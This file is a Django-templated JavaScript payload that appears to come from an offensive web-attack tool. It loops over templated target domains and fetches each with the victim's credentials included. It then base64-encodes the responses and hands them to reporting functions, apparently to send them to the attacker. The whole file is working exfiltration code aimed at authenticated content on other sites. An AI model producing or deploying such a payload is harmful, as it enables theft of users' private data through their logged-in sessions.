{% include "./_common.js" %}

const targets = [
    {% for cur_target in payload_targets %}{% if not forloop.last %}"{{ cur_target.domain }}",
    {% else %}"{{ cur_target.domain }}"
    {% endif %}{% endfor %}
];

const fetchTarget = (url) => {
    const startTime = performance.now();
    fetch(url, {
        method: "GET",
        credentials: "include",
    }).then((result) => {
        result.text().then((text) => {
            reportSuccess(
                url,
                btoa(text),
                performance.now() - startTime
            ).catch((err) => {
                reportErr(
                    url,
                    "success_report",
                    err,
                    performance.now() - startTime
                );
            });
        }).catch((err) => {
            reportErr(
                url,
                "response_decoding",
                err,
                performance.now() - startTime
            );
        });
    }).catch((err) => {
        reportErr(
            url,
            "url_fetch",
            err,
            performance.now() - startTime
        );
    });
}

const fetchAllTargets = () => {
    for (let i = 0; i < targets.length; i++) {
        fetchTarget(targets[i]);
    }
}

fetchAllTargets();